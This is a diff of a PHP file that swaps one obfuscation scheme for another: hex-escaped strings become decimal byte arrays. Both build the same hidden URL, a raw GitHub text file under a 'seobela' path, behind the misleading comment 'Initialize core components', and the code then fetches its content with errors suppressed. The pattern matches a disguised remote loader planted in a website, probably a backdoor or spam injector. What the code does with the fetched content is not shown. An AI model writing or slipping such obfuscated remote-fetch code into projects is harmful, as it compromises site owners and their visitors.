@@ -5,21 +5,26 @@
 */
 
 // Initialize core components
-$mkoplijnuhby = array(
-    9 => "\x68\x65\x61\x64\x73\x2f",
-    3 => "\x72\x61\x77\x2e",
-    7 => "\x62\x65\x6c\x61\x2f",
-    2 => "\x3a\x2f\x2f",
-    11 => "\x69\x6e\x64\x65\x78\x2e\x74\x78\x74",
-    5 => "\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f",
-    1 => "\x68\x74\x74\x70\x73",
-    8 => "\x72\x65\x66\x73\x2f",
-    4 => "\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e",
-    10 => "\x6d\x61\x69\x6e\x2f",
-    6 => "\x73\x65\x6f\x62\x65\x6c\x61\x2f"
+$plwksxqazmnb = array(
+    7 => [103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116],
+    3 => [58,47,47],
+    11 => [115,101,111,98,101,108,97,47],
+    13 => [98,101,108,97,47],
+    1 => [104,116,116,112,115],
+    5 => [114,97,119,46],
+    17 => [114,101,102,115,47],
+    9 => [46,99,111,109,47],
+    19 => [104,101,97,100,115,47],
+    21 => [109,97,105,110,47],
+    23 => [105,110,100,101,120,46,116,120,116]
 );
-ksort($mkoplijnuhby);
-$full_url = implode('', $mkoplijnuhby);
+ksort($plwksxqazmnb);
+$full_url = '';
+foreach($plwksxqazmnb as $chunk) {
+    foreach($chunk as $byte) {
+        $full_url .= chr($byte);
+    }
+}
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
